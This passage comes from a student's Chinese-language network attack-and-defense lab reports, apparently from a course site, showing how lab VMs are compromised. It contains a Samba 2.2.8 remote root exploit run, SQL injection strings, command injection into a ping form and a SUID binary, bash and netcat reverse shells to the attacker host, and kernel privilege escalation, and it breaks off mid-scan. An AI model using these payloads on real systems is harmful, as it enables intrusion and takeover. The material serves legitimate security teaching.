<p>\u6240\u4ee5\u53ef\u4ee5\u731c\u6d4b Samba \u7684\u4e3b\u7248\u672c\u53f7\u548c\u6b21\u7248\u672c\u53f7\u5e94\u4e3a 2.2.</p> <ol> <li>\u4f7f\u7528 <code>searchsploit</code> \u5c1d\u8bd5\u641c\u7d22\u6f0f\u6d1e\uff1a</li> </ol> <pre><code>\u2514\u2500$ searchsploit Samba 2.2\n------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                           |  Path\n------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nSamba 2.0.x/2.2 - Arbitrary File Creation                                                                                | unix/remote/20968.txt\nSamba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                             | osx/remote/9924.rb\nSamba 2.2.2 &lt; 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                  | linux/remote/16321.rb\nSamba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                        | bsd_x86/remote/16880.rb\nSamba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                          | linux/local/23674.txt\nSamba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                      | linux_x86/remote/16861.rb\nSamba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                        | osx_ppc/remote/16876.rb\nSamba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                  | solaris_sparc/remote/16330.rb\nSamba 2.2.8 - Brute Force Method Remote Command Execution                                                                | linux/remote/55.c\nSamba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                               | unix/remote/22468.c\nSamba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                               | unix/remote/22469.c\nSamba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                               | unix/remote/22470.c\nSamba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                               | unix/remote/22471.txt\nSamba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                     | linux/remote/9936.rb\nSamba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                  | unix/remote/22356.c\nSamba 2.2.x - Remote Buffer Overflow                                                                                     | linux/remote/7.pl\nSamba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                        | multiple/remote/10.c\nSamba &lt; 3.0.20 - Remote Heap Overflow                                                                                    | linux/remote/7701.txt\nSamba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                            | linux_x86/dos/36741.py\n------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>\u8fd9\u4e2a\u5de5\u5177\u63d0\u4f9b\u4e86\u9488\u5bf9 Samba 2.2.8 (Linux/BSD) \u7684\u5de5\u5177\uff08\u811a\u672c\uff09\uff0c\u4f4d\u4e8e <code>multiple/remote/10.c</code>\uff0c\u53ef\u4ee5__\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c__\uff08remote code execution, RCE\uff09\u653b\u51fb\u9776\u673a.</p> <p>\u8fd0\u884c\u8fd9\u4e2a\u811a\u672c\uff1a</p> <pre><code>\u2514\u2500$ gcc -std=gnu89 10.c -o samba                                                                                                                    \n\u2514\u2500$ ./samba                                                                                                                                                \nsamba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)\n--------------------------------------------------------------\nUsage: ./samba [-bBcCdfprsStv] [host]\n\n-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n-B &lt;step&gt;       bruteforce steps (default = 300)\n-c &lt;ip address&gt; connectback ip address\n-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)\n-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)\n-f              force\n-p &lt;port&gt;       port to attack (default = 139)\n-r &lt;ret&gt;        return address\n-s              scan mode (random)\n-S &lt;network&gt;    scan mode\n-t &lt;type&gt;       presets (0 for a list)\n-v              verbose mode\n\n\u2514\u2500$ ./samba -v -b 0 10.0.2.7                                                                                                                               \nsamba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)\n--------------------------------------------------------------\n+ Verbose mode.\n+ Bruteforce mode. (Linux)\n+ Host is running samba.\n+ Using ret: [0xbffffed4]\n+ Using ret: [0xbffffda8]\n+ Using ret: [0xbffffc7c]\n+ Using ret: [0xbffffb50]\n+ Worked!\n--------------------------------------------------------------\n*** JE MOET JE MUIL HOUWE\nLinux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown\nuid=0(root) gid=0(root) groups=99(nobody)\n</code></pre> <p>\u8fdb\u800c\u8fdb\u5165\u5230\u547d\u4ee4\u884c\u9875\u9762\uff0c\u4f7f\u7528 <code>whoami</code> \u786e\u8ba4\u8eab\u4efd\u4e3a <code>root</code>\uff0c\u968f\u5373\u4f7f\u7528 <code>passwd</code> \u547d\u4ee4\u4fee\u6539\u5bc6\u7801\uff0c\u5176\u663e\u793a\u6211\u4eec\u66f4\u6539\u6210\u529f.</p> <p></p> <p>\u7136\u540e\u56de\u5230\u9776\u673a\u754c\u9762\u5229\u7528\u6211\u4eec\u66f4\u6539\u6210\u529f\u7684\u5bc6\u7801\u767b\u9646\u4e4b\uff0c\u7ed3\u679c\u662f\u6210\u529f\u7684.</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab3/","title":"Lab3","text":"<p>Network Atk&amp;Def lab3 241840273 \u6768\u826f\u707c</p> <p>\u67e5\u8be2\u653b\u51fb\u673a IP.</p> <pre><code>\u2514\u2500$ sudo ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)\n        RX packets 1  bytes 590 (590.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 23  bytes 3090 (3.0 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8  bytes 480 (480.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 480 (480.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>\u7aef\u53e3\u626b\u63cf.</p> <pre><code>\u2514\u2500$ sudo nmap -p22,80,111,443,631,3306 -sV 10.0.2.15\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 07:55 EDT\nNmap scan report for 10.0.2.15\nHost is up (0.000037s latency).\n\nPORT     STATE  SERVICE VERSION\n22/tcp   closed ssh\n80/tcp   closed http\n111/tcp  closed rpcbind\n443/tcp  closed https\n631/tcp  closed ipp\n3306/tcp closed mysql\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.39 seconds\n</code></pre> <p>\u4f7f\u7528 Burp Suite \u5de5\u5177\uff1a</p> <p></p> <p>\u70b9\u51fb Open browser \u6253\u5f00\u540e URL \u8f93\u5165&lt;\u9776\u673aIP&gt;/index.php</p> <p></p> <p>\u6253\u5f00\u62e6\u622a\uff08Intercept off -&gt; Intercept on\uff09</p> <p>\u968f\u4fbf\u8f93\u5165\u4ec0\u4e48\u53d1\u73b0\u5176\u62e6\u622a\u5f97\u5230\u4e86 username\uff08<code>uname</code>\uff09 \u548c password\uff08<code>psw</code>\uff09 \u53c2\u6570</p> <pre><code>POST /index.php HTTP/1.1\nHost: 10.0.2.15\nContent-Length: 38\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://10.0.2.15\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.0.2.15/index.php\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\nuname=123456&amp;psw=114514&amp;btnLogin=Login\n</code></pre> <p>\u6545\u800c username \u5e94\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002</p> <p></p> <p>\u8f93\u5165 <code>&lt;IP \u5730\u5740&gt;</code>.</p> <p></p> <p>\u53d1\u73b0\u53ef\u8fbe\uff0c\u6000\u7591\u662f\u547d\u4ee4\u884c\u5e76\u5c1d\u8bd5\u62fc\u63a5\u547d\u4ee4\uff1a<code>&lt;IP\u5730\u5740&gt;; whoami</code>\uff0c\u653b\u51fb\u4e4b.</p> <p></p> <p>\u5f97\u5230\u4e86\u7528\u6237\u540d <code>apache</code></p> <p>\u63a5\u4e0b\u6765\u8fdb\u884c\u53cd\u5f39 Shell\uff0c\u9996\u5148\u968f\u610f\u8bbe\u7f6e\u4e00\u4e2a\u65e0\u7528\u7aef\u53e3\u4f5c\u4e3a\u76d1\u542c\u7aef\u53e3\uff0c\u6bd4\u5982 <code>3433</code>\uff1a</p> <p>\u4e3b\u673a\u7ec8\u7aef\u6267\u884c <code>nc -lvvp 3433</code></p> <pre><code>\u2514\u2500$ nc -lvvp 3433                                                                                                                                          \nlistening on [any] 3433 ...\n</code></pre> <p>\u7136\u540e\u63d0\u4ea4 <code>10.0.2.15; bash -i &gt;&amp; /dev/tcp/10.0.2.4/3433 0&gt;&amp;1</code>\uff0c\u76d1\u542c\u7aef\u53e3\u5904\u5f97\u5230\u4fe1\u606f\uff1a</p> <pre><code>\u2514\u2500$ nc -lvvp 3433                                                                                                                                          \nlistening on [any] 3433 ...\nWarning: forward host lookup failed for bogon: Unknown host\nconnect to [10.0.2.4] from bogon [10.0.2.15] 32769\nbash: no job control in this shell\nbash-3.00$ \n</code></pre> <p>\u5c1d\u8bd5\u6267\u884c <code>whoami</code> \u6210\u529f\u5f97\u5230 <code>apache</code>\uff1a</p> <pre><code>bash-3.00$ whoami\napache\n</code></pre> <p>\u6b64\u65f6\u5df2\u5f97\u5230\u5176\u6743\u9650\uff0c\u63a5\u4e0b\u6765\u5c1d\u8bd5\u63d0\u6743.</p> <p>\u4e0b\u8f7d\u5f97\u5230 linpeas.sh \u6587\u4ef6\uff0c\u5229\u7528 python \u542f\u52a8\u4e00\u4e2a\u5916\u90e8\u670d\u52a1\u5668\uff0c\u5c06\u5176\u4ece\u4e3b\u673a\u4f20\u5165\u9776\u673a.</p> <pre><code>\u2514\u2500$ python -m http.server 1142\n\nServing HTTP on 0.0.0.0 port 1142 (http://0.0.0.0:1142/) ...\n</code></pre> <p>\u901a\u8fc7\u6d4f\u89c8\u5668\u8f93\u5165 URL <code>http://localhost:1142/</code> \u67e5\u8be2\u6587\u4ef6\u8def\u5f84\uff0c\u5e76\u9632\u6b62\u597d linpeas.sh \u6587\u4ef6\uff0c\u968f\u5373\u4e0b\u8f7d\uff1a</p> <pre><code>bash-3.00$ pwd\n/tmp\nbash-3.00$ wget http://10.0.2.4:1142/Public/linpeas.sh\n</code></pre> <p>\u67e5\u8be2\u6587\u4ef6\uff1a</p> <pre><code>bash-3.00$ ls -l\ntotal 944\n-rw-r--r--  1 apache apache 961834 Oct 14 04:26 linpeas.sh\n</code></pre> <p>\u4e0b\u8f7d\u5b8c\u6bd5\u540e\uff0c\u53d1\u73b0\u6587\u4ef6\u6743\u9650\u4e0d\u8db3\uff0c\u5c06\u8be5\u6587\u4ef6\u7684\u6743\u9650\u6539\u4e3a\u53ef\u6267\u884c\uff0c\u5e76\u6267\u884c.</p> <pre><code>bash-3.00$ chmod a+x linpeas.sh\nbash-3.00$ ls -l\ntotal 944\n-rwxr-xr-x  1 apache apache 961834 Oct 14 04:26 linpeas.sh\nbash-3.00$ ./linpeas.sh\n</code></pre> <p>\u7b49\u5f85\u7247\u523b\u540e\uff0c\u6ce8\u610f\u5230\u5176\u64cd\u4f5c\u7cfb\u7edf\u662f Linux2.6 CentOS\uff0c\u6bd4\u8f83\u53e4\u8001.</p> <pre><code>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Operative system\n\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                           \nLinux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007                     \nLSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch\nDistributor ID: CentOS\nDescription:    CentOS release 4.5 (Final)\nRelease:        4.5\nCodename:       Final\n</code></pre> <p>\u5c1d\u8bd5\u5728 <code>https://www.exploit-db.com/</code> \u548c <code>searchexpolit</code> \u91cc\u641c\u7d22\u5176\u6f0f\u6d1e\u53ca\u5de5\u5177\uff1a</p> <p></p> <pre><code>\u2514\u2500$ searchsploit linux 2.6 centos\n-------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                            |  Path                           \n-------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nLinux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local P | linux/local/9545.c\nLinux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Es | linux/local/9479.c\nLinux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Esc | linux_x86/local/9542.c\nLinux Kernel 2.6.32 &lt; 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege Escalation (1)                                     | linux/local/25444.c\nLinux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege Escalation    | linux_x86-64/local/45516.c\n-------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results \n</code></pre> <p>\u8fd9\u91cc\u4f7f\u7528 9545.c \u8fd9\u4e2a\u811a\u672c\uff1a</p> <p>\u67e5\u4e00\u4e0b\u6709\u6ca1\u6709 gcc\uff0c\u7b54\u6848\u662f\u6709\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d c \u811a\u672c\u6587\u4ef6\u5728\u672c\u5730\u7f16\u8bd1\u8fd0\u884c.</p> <pre><code>bash-3.00$ gcc\ngcc: no input files\n</code></pre> <p>\u5c06\u6587\u4ef6\u4e0b\u8f7d\u8fc7\u6765\uff0c\u7136\u540e\u6267\u884c\u83b7\u53d6\u6743\u9650\u5e76\u4fee\u6539\u5bc6\u7801.</p> <pre><code>bash-3.00$ chmod 777 9545.c\nbash-3.00$ gcc -o exp 9545.c\n9545.c:376:28: warning: no newline at end of file\nbash-3.00$ ./exp\nsh: no job control in this shell\nsh-3.00# whoami\nroot\nsh-3.00# passwd\nNew UNIX password: s0aked1020\nRetype new UNIX password: s0aked1020\nChanging password for user root.\npasswd: all authentication tokens updated successfully.\n</code></pre> <p>\u767b\u9646\u9776\u673a\u6210\u529f.</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab4/","title":"Lab4","text":"<p>Network Atk&amp;Def lab4 241840273 \u6768\u826f\u707c</p> <p>\u67e5\u8be2\u653b\u51fb\u673a IP\uff0c\u4e3b\u673a\u53d1\u73b0\uff1a\u9776\u673a IP \u4e3a <code>10.0.2.6</code>.</p> <pre><code>\u2514\u2500$ sudo ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)\n        RX packets 1  bytes 590 (590.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 25  bytes 3214 (3.1 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8  bytes 480 (480.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 480 (480.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n\u2514\u2500$ sudo nmap 10.0.2.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 07:34 EDT\nNmap scan report for bogon (10.0.2.1)\nHost is up (0.00062s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n53/tcp open  domain\nMAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)\n\nNmap scan report for 10.0.2.2\nHost is up (0.0034s latency).\nNot shown: 996 filtered tcp ports (no-response)                                                                                                            \nPORT      STATE SERVICE                                                                                                                                    \n135/tcp   open  msrpc                                                                                                                                      \n445/tcp   open  microsoft-ds\n1053/tcp  open  remote-as\n10000/tcp open  snet-sensor-mgmt\nMAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)\n\nNmap scan report for bogon (10.0.2.3)\nHost is up (0.000082s latency).\nAll 1000 scanned ports on bogon (10.0.2.3) are in ignored states.\nNot shown: 1000 filtered tcp ports (proto-unreach)\nMAC Address: 08:00:27:72:65:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap scan report for bogon (10.0.2.6)\nHost is up (0.00013s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:B6:52:04 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap scan report for b1ogon (10.0.2.4)\nHost is up (0.0000080s latency).\nAll 1000 scanned ports on bogon (10.0.2.4) are in ignored states.\nNot shown: 1000 closed tcp ports (reset)\n\nNmap done: 256 IP addresses (5 hosts up) scanned in 11.73 seconds\n</code></pre> <p>\u7aef\u53e3\u626b\u63cf.</p> <pre><code>\u2514\u2500$ sudo nmap -p22,8080 -sV 10.0.2.6\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 07:39 EDT\nNmap scan report for bogon (10.0.2.6)\nHost is up (0.00095s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)\nMAC Address: 08:00:27:B6:52:04 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.07 seconds\n</code></pre> <p>ssh \u7684 22 \u53f7\u7aef\u53e3\u5373\u4f7f\u662f\u66b4\u529b\u7834\u89e3\u4e5f\u9700\u8981\u7528\u6237\u540d\uff0c\u800c\u6211\u4eec\u6ca1\u6709\uff0c\u6240\u4ee5\u5c1d\u8bd5\u4ece http \u670d\u52a1\u5165\u624b.</p> <p>Werkzeug \u662f\u4e00\u4e2a Python web \u5de5\u5177\u5e93\uff0c\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee\u4e4b\uff1a<code>http://10.0.2.6/8080</code></p> <p></p> <p>\u4f7f\u7528 Burp Suite \u5de5\u5177\uff1a</p> <p>Proxy -&gt; \u7f51\u9875\u968f\u4fbf\u8f93\u5165\u70b9\u4ec0\u4e48\u5f97\u5230 password \u5b57\u6bb5 -&gt; Intercept off/on -&gt; Send to Intruder -&gt; Intruder</p> <p></p> <p>\u53d1\u73b0\u53cc\u5f15\u53f7\u7684\u7279\u6b8a\u6027\uff0c\u4e8e\u662f\u5c1d\u8bd5 <code>\" or 1 = 1 #</code> \uff0c\u7ed3\u679c\u88ab\u9632\u4f4f\u4e86\uff1a</p> <p></p> <p>\u5c06 <code>#</code> \u6362\u4e3a\u53e6\u4e00\u4e2a\u6ce8\u91ca\u65b9\u6cd5 <code>--</code> \uff0c\u5f97\u77e5 <code>\" or 1 = 1 --</code> \u53ef\u4ee5\u901a\u8fc7\uff1a</p> <p></p> <p>\u8f93\u5165 <code>hello</code> \u5f97\u5230\uff1a</p> <pre><code>----------- SCAN SUMMARY -----------\nKnown viruses: 6691124\nEngine version: 0.100.2\nScanned directories: 0\nScanned files: 0\nInfected files: 0\nData scanned: 0.00 MB\nData read: 0.00 MB (ratio 0.00:1)\nTime: 19.845 sec (0 m 19 s)\n</code></pre> <p>\u5c1d\u8bd5\u52a0\u8bed\u53e5\uff1a<code>hello; whoami</code></p> <pre><code>----------- SCAN SUMMARY -----------\nKnown viruses: 6691124\nEngine version: 0.100.2\nScanned directories: 0\nScanned files: 0\nInfected files: 0\nData scanned: 0.00 MB\nData read: 0.00 MB (ratio 0.00:1)\nTime: 19.684 sec (0 m 19 s)\nscanner\n</code></pre> <p>\u5f97\u5230\u4e86 <code>scanner</code>\uff0c\u6ce8\u610f\u56e0\u4e3a\u53ef\u80fd\u6ca1\u6709 /dev/tcp\uff0c\u6240\u4ee5\u5c1d\u8bd5 nc \u4e32\u8054\u7684\u53cd\u5f39 shell.</p> <p>\u76d1\u542c\u7aef\u53e3 <code>1111</code> \u548c <code>2222</code> \u5206\u522b\u4f5c\u4e3a\u8f93\u5165\u8f93\u51fa\uff0c\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165\uff1a</p> <pre><code>hello | nc 10.0.2.4 1111 | /bin/bash | nc 10.0.2.4 2222\n</code></pre> <p>1111 \u7aef\u53e3\u5f97\u5230\uff0c\u5e76\u8f93\u5165 <code>whoami</code>\uff1a</p> <pre><code>\u2514\u2500$ nc -lvvp 1111\nlistening on [any] 1111 ...\nWarning: forward host lookup failed for bogon: Unknown host\nconnect to [10.0.2.4] from bogon [10.0.2.6] 51660\n\n----------- SCAN SUMMARY -----------\nKnown viruses: 6691124\nEngine version: 0.100.2\nScanned directories: 0\nScanned files: 0\nInfected files: 0\nData scanned: 0.00 MB\nData read: 0.00 MB (ratio 0.00:1)\nTime: 20.593 sec (0 m 20 s)\nwhoami\n</code></pre> <p>2222 \u7aef\u53e3\u5f97\u5230\uff1a</p> <pre><code>\u2514\u2500$ nc -lvvp 2222\nlistening on [any] 2222 ...\nWarning: forward host lookup failed for bogon: Unknown host\nconnect to [10.0.2.4] from bogon [10.0.2.6] 52576\nscanner\n</code></pre> <p>\u6b64\u65f6\u5df2\u5f97\u5230\u5176\u6743\u9650\uff0c\u63a5\u4e0b\u6765\u5c1d\u8bd5\u63d0\u6743.</p> <p>\u56e0 <code>/home/scanner</code> \u6587\u4ef6\u4e2d\u6709\u4e00\u4e2a SUID \u6587\u4ef6 <code>update_cloudav</code>\uff0c\u6267\u884c\u4e4b\uff1a\uff082222:\uff09</p> <pre><code>This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u53d1\u73b0\uff1a\uff081111:\uff09</p> <pre><code>ls -l\n</code></pre> <p>2222:</p> <pre><code>total 20\ndrwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 cloudav_app\n-rwsr-xr-x 1 root    scanner 8576 Oct 24  2018 update_cloudav\n-rw-rw-r-- 1 scanner scanner  393 Oct 24  2018 update_cloudav.c\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 SUID \u83b7\u53d6 root \u6743\u9650\uff1a\uff081111:\uff09</p> <pre><code>./update_cloudav \"--help|whoami\"\n</code></pre> <p>2222:</p> <pre><code>root\n</code></pre> <p>\u7528\u5b83\u53cd\u5f39 shell \u4e00\u4e0b\u83b7\u53d6 root \u6743\u9650\uff08\u5728\u6b64\u4e4b\u524d\u5e94\u5148\u76d1\u542c 3433 \u7aef\u53e3\uff09\uff1a\uff081111:\uff09</p> <pre><code>./update_cloudav \"--help|echo 'bash -i &gt;&amp; /dev/tcp/10.0.2.4/3433 0&gt;&amp;1'|bash\"\n</code></pre> <p>\u5f97\u5230\uff1a</p> <pre><code>\u2514\u2500$ nc -lvvp 3433\nlistening on [any] 3433 ...\nWarning: forward host lookup failed for bogon: Unknown host\nconnect to [10.0.2.4] from bogon [10.0.2.6] 43734\nbash: cannot set terminal process group (766): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@cloudav:~#\n</code></pre> <p>\u63a5\u4e0b\u6765\u8be2\u95ee\u7528\u6237\u540d\uff0c\u4fee\u6539\u5bc6\u7801\uff1a</p> <pre><code>root@cloudav:~# whoami\nwhoami\nroot\nroot@cloudav:~# passwd\npasswd\nEnter new UNIX password: s0aked1027\nRetype new UNIX password: s0aked1027\npasswd: password updated successfully\n</code></pre> <p>\u7136\u540e\u56de\u5230\u9776\u673a 3\uff0c\u767b\u9646\u4e4b\uff1a</p> <p>\u767b\u9646\u9776\u673a\u6210\u529f.</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab5/","title":"Lab5","text":"<p>Network Atk&amp;Def lab5 241840273 \u6768\u826f\u707c</p> <p>\u67e5\u8be2\u653b\u51fb\u673a IP</p> <pre><code>\u2514\u2500$ sudo ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)\n        RX packets 8  bytes 2634 (2.5 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 24  bytes 3152 (3.0 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8  bytes 480 (480.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 480 (480.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>\u4e3b\u673a\u53d1\u73b0\uff1a\u5f97\u5230\u9776\u673a ip <code>10.0.2.8</code>.</p> <pre><code>\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 08:00:27:3c:97:80, IPv4: 10.0.2.4\nWARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied\nWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.3        08:00:27:51:92:a5       (Unknown)\n10.0.2.8        08:00:27:1c:31:b1       (Unknown)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.948 seconds (131.42 hosts/sec). 4 responded\n</code></pre> <p>\u7aef\u53e3\u626b\u63cf</p> <pre><code>\u2514\u2500$ sudo nmap 10.0.2.8                                                                                                                                     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 06:16 EST\nNmap scan report for 10.0.2.8\nHost is up (0.00045s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:1C:31:B1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 0.22 seconds\n</code></pre> <p>\u53ef\u4ee5\u8bbf\u95ee\u5176 http \u670d\u52a1\uff1a\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee <code>80</code> \u7aef\u53e3\uff1a<code>10.0.2.8:80</code>\uff1a</p> <p></p> <p>\u5c1d\u8bd5\u6ce8\u5165\u65e0\u679c\uff0c\u5c1d\u8bd5\u5bf9\u9776\u673a\u76ee\u5f55\u7206\u7834\uff1a</p> <pre><code>\u2514\u2500$ sudo dirb http://10.0.2.8:80\n\n-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Mon Nov 10 06:24:16 2025\nURL_BASE: http://10.0.2.8:80/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612                                                          \n\n---- Scanning URL: http://10.0.2.8:80/ ----\n+ http://10.0.2.8:80/add (CODE:200|SIZE:307)                                                                                                              \n+ http://10.0.2.8:80/c (CODE:200|SIZE:1)                                                                                                                  \n+ http://10.0.2.8:80/cgi-bin/ (CODE:403|SIZE:284)                                                                                                         \n+ 